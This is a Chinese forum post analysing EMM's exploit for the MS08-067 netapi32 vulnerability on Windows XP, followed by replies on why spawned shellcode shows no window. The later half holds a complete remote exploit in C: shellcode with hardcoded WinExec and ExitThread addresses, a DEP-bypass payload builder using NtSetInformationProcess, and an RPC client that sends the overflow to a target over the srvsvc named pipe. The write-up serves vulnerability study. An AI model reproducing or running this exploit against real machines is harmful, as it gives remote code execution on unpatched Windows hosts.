
# EMM's MS08-067 exploit 原理分析

> 原文：[`www.pediy.com/kssd/pediy10/80416.html`](https://www.pediy.com/kssd/pediy10/80416.html)

## 一 前言

EMM 的 Exploit 方法很巧妙，尤其是对于我这种菜鸟来说，更是耳目一新。尽管 MS08-067 漏洞已经过去 N 久了，但貌似还没有分析 Exploit 的文章出现，看来大牛们都懒得写，所以我贴篇自己的调试总结出来，与各位小菜们共勉。如有雷同，实属巧合。

关于漏洞本身的分析文章已经铺天盖地，所以此处不再重复，有不清楚的请先复习下。注意测试之前要关闭 DEP 保护。

## 二 调试 XPSP2_2976 版本

我测试的 `netapi32.dll` 版本是 `2976`，在 XPSP2 平台上成功，这部分的调试将以此版本为主；

根本上来说，Exploit 的难点就是如何在栈的低址构造出 L'\\'字符，即 `0x005c`，所以 EMM 的思路就是在调用 `NetpwPathCanonicalize` 前，先调用一个其它函数，帮助在栈的低址构造出 L'\\'字符。这个函数就是 `NetpwNameCompare`，调用代码：

```
// srvsvc_NetPRNameCompare -> NetpwNameCompare
      func23(L"ph4nt0m",(wchar_t *)"\\x53\\x00\\x56\\x89\\x56\\x89\\x56\\x89\\x56\\x89",(wchar_t *)"\\x4D\\x00\\x56\\x89\\x56\\x89",4,0);
```

从上面可以看到，`NetpwNameCompare` 的输入参数中有两个都是特定的 Unicode 字符串，用 OD 附加到 `svchost.exe` 上调试，运行流程如下：

`NetpwNameCompare`
    |\__CompareOemNames
        |\__RtlUpcaseUnicodeToOemN

最后调用的是 `RtlUpcaseUnicodeToOemN`，它的主要功能就是把一个 Unicode 字符串转换为大写的 OEM 字符串，函数原型如下：

```
NTSTATUS  RtlUpcaseUnicodeToOemN(
   OUT PCHAR  OemString,     
   IN ULONG  MaxBytesInOemString,     
   OUT PULONG BytesInOemString  OPTIONAL,     
   IN PWSTR  UnicodeString,     
   IN ULONG  BytesInUnicodeString     
   );
```

自己可以写个测试代码来看看，输入的这两个字符串经过 `RtlUpcaseUnicodeToOemN` 调用后，会变成什么样子捏？

```
typedef LONG NTSTATUS;
typedef NTSTATUS  (WINAPI *pRtlUpcaseUnicodeToOemN)( 
   OUT PCHAR  OemString,     
   IN ULONG  MaxBytesInOemString,     
   OUT PULONG BytesInOemString  OPTIONAL,     
   IN PWSTR  UnicodeString,     
   IN ULONG  BytesInUnicodeString     
   );
   
    NTSTATUS status;
    pRtlUpcaseUnicodeToOemN RtlUpcaseUnicodeToOemN;
    CHAR    OemString1[100] = {0};
    CHAR    OemString2[100] = {0};
    ULONG   MaxBytesInOemString1 = sizeof(OemString1);
    ULONG   MaxBytesInOemString2 = sizeof(OemString2);
    ULONG   BytesInOemString = 0;
    CHAR    UnicodeString1[] = "\\x53\\x00\\x56\\x89\\x56\\x89\\x56\\x89\\x56\\x89";
    CHAR    UnicodeString2[] = "\\x4D\\x00\\x56\\x89\\x56\\x89";
    ULONG   BytesInUnicodeString1 = sizeof(UnicodeString1)-sizeof(UnicodeString1[0]);
    ULONG   BytesInUnicodeString2 = sizeof(UnicodeString2)-sizeof(UnicodeString2[0]);

    hLib = LoadLibrary("ntdll.dll");
    RtlUpcaseUnicodeToOemN = (pRtlUpcaseUnicodeToOemN)GetProcAddress(hLib, "RtlUpcaseUnicodeToOemN");
    
    status = RtlUpcaseUnicodeToOemN(OemString1,
        MaxBytesInOemString1,
        &BytesInOemString,
        (PWSTR)UnicodeString1,
        BytesInUnicodeString1);
        
    status = RtlUpcaseUnicodeToOemN(OemString2,
        MaxBytesInOemString2,
        &BytesInOemString,
        (PWSTR)UnicodeString2,
        BytesInUnicodeString2);
    
    FreeLibrary(hLib);
```

用 VC6 编译就可以了，调试运行它可以看到：

输入的第一个字符串: `\\x53\\x00\\x56\\x89\\x56\\x89\\x56\\x89\\x56\\x89`

转换后会变成: `53 D2 5C D2 5C D2 5C D2 5C 00`

第二个字符串: `\\x4D\\x00\\x56\\x89\\x56\\x89`

转换后会变成: `4D D2 5C D2 5C 00`

可见，经过 `RtlUpcaseUnicodeToOemN` 转换后，栈缓冲区中就会存放着 L'\\'(0x005C)字符，虽然 `CompareOemNames` 函数返回后栈就无效了，但 `0x005C` 字符还在；紧接着在后面调用 `NetpwPathCanonicalize`，由于 `0x005C` 正好位于栈的低地址，因此能被成功搜索到，之后调用 `wcscpy`，由于源缓冲区是可控制的输入参数，因此只要精确覆盖 `wcscpy` 的返回地址，就能得到 CPU 的控制权了；

另外，由于是在 MS08-067 函数返回前执行的 `wcscpy`，因此即使 MS08-067 函数有 GS 保护也没用。

## 三 调试 XPSP2_2180 版本

在测试 `2180` 版本的 `netapi32.dll` 时，发现总是不能成功，所以又调试了一遍，意外发现了 `2180` 版本的另外一个 BUG，即 `CanonicalizePathName` 的栈缓冲区在某些情况下会导致没有初始化就使用了，所以导致 Exploit 不能成功。它的输入参数如下：

![](img/ec847b3816a9ed00a09e8668b135d167.jpg)

用 IDA 分析它的流程可知，如果 Prefix 的长度不为 0，那么它执行如下操作：

```
wcscpy(Buffer, Prefix);
wcscat(Buffer, L'\\');
wcscat(Buffer, PathName);
```

如果 Prefix 的长度为 0，执行如下操作：

```
wcscat(Buffer, PathName);
```

从这里就可以看出问题来了，如果我们输入的 Prefix 长度是 0，那么 Buffer 缓冲区还没有被初始化就使用了。下图显示的就是执行 wcscat 前的情况，

![](img/6f42759ab717f6725948f422543288ed.jpg)

可以看到这个缓冲区的起始数据正好不是 0，开始两个字节是 0003，所以 wcscat 的目标缓冲区将是从 0003 之后地址开始，下图显示的是执行 wcscat 之后，

![](img/1ac9ced1e3f54b990f0aa4fa1b186ccc.jpg)

现在找到 Exploit 对于 XPSP2_2180 版本无效的原因了。由于这个缓冲区的开头夹杂了随机数据，在进入到带漏洞的 MS08-067 函数后，无法通过验证，早早就退出了，所以 Exploit 无法成功。不过，这个 BUG 在 2180 版本之后已被改正，例如前面讲到的 2976 版本，在 wcscat 之前对 Buffer 缓冲区的开头数据赋了初值 0。

## 四 问题

自己把 Shellcode 替换为创建 `calc.exe` 进程，测试成功，如下图所示：

![](img/57efb114c5e5fb327043185dfd13aefb.jpg)

但是由于 `calc.exe` 进程是在 `svchost.exe` 中创建的，所以能够看到创建成功，却无法显示出 calc 的 GUI 界面，不知道这种情况下，有什么办法可以让 calc 弹出 GUI 来？

我之前也是遇到 calc 不弹出 gui 的情况，不清楚你的 shellcode 中是不是用的 `WinExec` 函数，如果是，那么：

```
UINT WinExec(
  LPCSTR lpCmdLine,  // command line
  UINT uCmdShow      // window style，尝试设置为 SW_SHOW 或者其他合适值
);
```

直接用 Metasploit 生成的 Shellcode，估计是 `CreateProcess` 吧。

貌似是因为服务进程不带 GUI，并且和用户进程所用桌面不同的缘故，好像比较复杂。

```
BOOL CreateProcess(
  LPCTSTR lpApplicationName,                  // name of executable module
  LPTSTR lpCommandLine,                       // command line string
  LPSECURITY_ATTRIBUTES lpProcessAttributes, // SD
  LPSECURITY_ATTRIBUTES lpThreadAttributes,  // SD
  BOOL bInheritHandles,                      // handle inheritance option
  DWORD dwCreationFlags,                     // creation flags
  LPVOID lpEnvironment,                      // new environment block
  LPCTSTR lpCurrentDirectory,                // current directory name
  LPSTARTUPINFO lpStartupInfo,               // startup information, 如果设定为 NULL，继承父进程的 STARTUPINFO
  LPPROCESS_INFORMATION lpProcessInformation // process information
);
```

```
typedef struct _STARTUPINFO {  
    DWORD   cb;  
    LPTSTR  lpReserved;  
    LPTSTR  lpDesktop;  
    LPTSTR  lpTitle;  
    DWORD   dwX;  
    DWORD   dwY;  
    DWORD   dwXSize;  
    DWORD   dwYSize;  
    DWORD   dwXCountChars;  
    DWORD   dwYCountChars;  
    DWORD   dwFillAttribute;  
    DWORD   dwFlags;  
    WORD    wShowWindow;  
    WORD    cbReserved2;  
    LPBYTE  lpReserved2;  
    HANDLE  hStdInput;  
    HANDLE  hStdOutput;  
    HANDLE  hStdError;  
} STARTUPINFO, *LPSTARTUPINFO;  
```

忒麻烦了点~~~~

1.`wcscpy` 和上一层函数都没有栈 cookie 保护，再上一层函数就有了。因此，覆盖下面两层函数的返回地址都不会有问题，通常是覆盖 `wcscpy` 的返回地址跳到一个可执行的区域（return2libc），然后去掉 DEP 的保护。然后就可高枕无忧地跳回栈中的 shellcode 去执行。

2.看不到窗体的确是因为服务要指定用户的桌面。否则它怎么知道要把窗体显示在谁的桌面上？

3.看看我这个 EXP，可以过 DEP 的。请在 WINXP SP3 下测试。

```
UCHAR ucSC_SP3[] =
"\\x33\\xDB\\x53\\x68\\x63\\x61\\x6C\\x63\\x8B\\xF4\\x53\\x56\\xBF"
"\\xAD\\x23\\x86\\x7C"//winexec 地址
"\\xFF\\xD7\\x53\\xBF"
"\\xE8\\xC0\\x80\\x7C"//ExitThread 地址
"\\xFF\\xD7";
```

// 去掉 DEP
```
void MakeExpData(LPVOID lpBuf)
{
  LPBYTE lpBt = (LPBYTE)lpBuf;
  int i = 0;
  for (i = 0; i < 512*2; i +=4)
  {
    *(long*)(lpBt + i) = 0x90909090;
  }
  //注意，下面构造的串要注意字节对齐问题（4 字节），否则数值将会被拆散
  memcpy(lpBt, L"\\a\\..\\..\\abcd", wcslen(L"\\a\\..\\..\\abcd")*2);
  //准确的存放返回地址的地方应该距离上面最后一个'\\'是 0xA0
  //0x7C956831, 调用 NtSetInformationProcess 的地址
  *(long*)(lpBt + 0x8*2 + 0xa0 - 4) = 0x00030080;
  *(long*)(lpBt + 0x8*2 + 0xa0) = 0x58fc17c2;
  //后面跟一个返回地址, 与前面空出 4 个字节是给 pop ebp 用
  *(long*)(lpBt + 0x8*2 + 0xa0 + 8) = 0x7ffa4512;
  //在后面添加 shellcode，空出 4 个字节是给 ret 4 用
  memcpy(lpBt + 0x8*2 + 0xa0 + 16, ucSC_SP3, sizeof(ucSC_SP3)-1);
}
```

//code by liangyu
```
int main(int argc, char *argv[])
{
  RPC_STATUS status;
  LPBYTE lpObjUuid = /*NULL*/"4b324fc8-1670-01d3-1278-5a47bf6ee188";//这个 GUID 可以为 NULL，RPC 文件含有
  LPBYTE lpProtSeq = "ncacn_np";
  LPBYTE lpNetworkAddr = argv[1];
  LPBYTE lpEndPoint = /*"\\pipe\\browser"*/"\\pipe\\srvsvc";//这两个命名管道都可以
  LPBYTE lpOptions = NULL;
  LPBYTE lpStringBinding = NULL;
  status = RpcStringBindingCompose(lpObjUuid, lpProtSeq, lpNetworkAddr, lpEndPoint, lpOptions, &lpStringBinding);
  if (status != RPC_S_OK)
  {
    printf("RpcStringBindingCompose FAILED!\r\n");
    return 0;
  }
  status = RpcBindingFromStringBinding(lpStringBinding, &srvsvc__MIDL_AutoBindHandle);
  if (status != RPC_S_OK)
  {
```



```c
RpcStringFree(&lpStringBinding);

printf("RpcBindingFromStringBinding FAILED!\r\n");

return 0;
}

RpcTryExcept
WCHAR wcPath[512] = {0};
BYTE btOut[1024] = {0};
long lType = 100;
long lFlag = 0;
// func23，即 NetpwNameCompare(0x5fddf3ef)
func23(L"exploit",(wchar_t *)"\\x53\\x00\\x56\\x89\\x56\\x89\\x56\\x89\\x56\\x89",(wchar_t *)"\\x4D\\x00\\x56\\x89\\x56\\x89",4,0);//在栈中构造一个‘\\’痕迹
//开始生成并发送 EXP 数据
MakeExpData(wcPath);
//调用 NetpwPathCanonicalize
func1f(L"exploit", wcPath, btOut, 1024, L"", &lType, lFlag);
RpcExcept(EXCEPTION_EXECUTE_HANDLER)
printf("RpcExceptionCode:%d\r\n", RpcExceptionCode());
RpcEndExcept
RpcStringFree(&lpStringBinding);
RpcBindingFree(&srvsvc__MIDL_AutoBindHandle);
return 0;
}
```

## 弹不出界面的原因

至于为什么弹不出来界面，在西方失败兄的《深入浅出 MS06-040》已经讲的很明白了。

这里引用下给大家解释下：

在 shellcode 中的相应位置修改一下函数地址，赶快往外发吧！我当时在 VC 里点感叹号运行的时候就像星矢对波士顿射黄金箭的心情一样充满了善良美好的期望，背负了维护世界和平的重任，为了自由为了亲人为了朋友为了爱而让它运行。

结果很不幸，靶机并没有弹出我们希望的 BOX，但是也没有像前面攻击失败那样搞的系统崩溃而重启。如果你有声卡连着音响的话，你应该能听到一声 `MessageBox` 弹出时那熟悉的“咚”的一声；如果没有声卡的话主板也会“嘀”一下的。用 `OLLYDBG` 跟踪调试一下，发现程序如我们设计的那样在函数返回时执行了 `call ecx`，然后顺着 shellcode 执行，但到了 `call MessageBoxA` 的时候，无法返回，程序挂起了。我跟踪进 `MessageBoxA` 这个调用到最底层，大概是在获得最顶端窗口句柄的时候出的问题。不停的发溢出攻击，在靶机的任务管理器里看 `service.exe` 这个进程会不停的增加内存使用，同时也不停的“咚咚”或者“嘀嘀”。

这是为什么呢？ 我觉得这个现象可以这样解释：由于我们溢出的进程 `service.exe` 是一个服务，服务是不和用户界面打交道的，在用户登录操作系统之前就已经开始在后台运行了，虽然它也加载 `user32.dll`，但是在真正涉及到 UI 的时候，它甚至无法知道要把这个框框 pop 到哪个用户的桌面上。所以说这里我们实际上已经攻击成功了，`MessageBox` 是踏踏实实的弹出来了，那一下“咚”或者“嘀”可以作证，系统没有崩溃可以作证。`OLLYDBG` 调试时程序挂起应该是框框弹出来，等待鼠标点击“确定”按钮的消息，以便退出函数调用，而这个框框又不知道弹到哪里去了，显示不在桌面上，所以我们没办法点按钮，也就自然退不出函数调用了，这也解释了 `service.exe` 很有规律的不断增加内存使用的现象。

综上，结合 RPC 调用编程和本地溢出实验中的技术，我们已经可以让远程目标机执行任意的代码了（虽然只听到响声没看到框框）。

## 引用讨论

引用: *最初由 **vxasm**发布* ![查看帖子](http://bbs.pediy.com/showthread.php?p=564986#post564986) 必须在服务初始化时与用户进程的 Desktop 绑定，麻烦。

你的 shellcode 在 `CreateProcess` 时增加对窗口站、桌面的设置，最简单的比如:

```
si.lpDesktop = "WinSta0\\Default";
```

`&si` 作为 `CreateProcess()` 的倒数第二个形参，具体的可查 MSDN。

引用: *最初由 **netwind**发布* ![查看帖子](http://bbs.pediy.com/showthread.php?p=565457#post565457) 不知道是不是 这样的问题:

http://bbs.pediy.com/showthread.php?t=76204

"另外我发现公布的 exploit 好几个版本(metasploit 除外没细看)都是  

`fun(".\\\\\\x\\..\\..\\xxxxxxxx..."...`

不错，在 2180 版本上不成功是因为没打补丁的缘故，但是如果采用 Prefix 加'.'的办法，则也可以成功。

代码:

```
func1f(L"EMM!",(wchar_t *)Buff,Buff2,1000,L".",(DWORD *)Buff3,1);
```

.....

引用: *最初由 **scz**发布* ![查看帖子](http://bbs.pediy.com/showthread.php?p=565526#post565526) 你的 shellcode 在 CreateProcess 时增加对窗口站、桌面的设置，最简单的比如:

```
si.lpDesktop = "WinSta0\\Default";
```

`&si` 作为 `CreateProcess()` 的...

感谢 `scz`，这种方法貌似很简单，但如果不是 `CreateProcess`，而是 `WinExec` 之类的，是不是就没办法了呢？呵呵。

我试一下。

另外，最新调试了下，发现 MetaSploit 这段创建 calc 的 Shellcode 用的是 `Winexec`。

和 `MS06-040` 非常相似的问题``` ``` 都是同一个函数出现的问题.
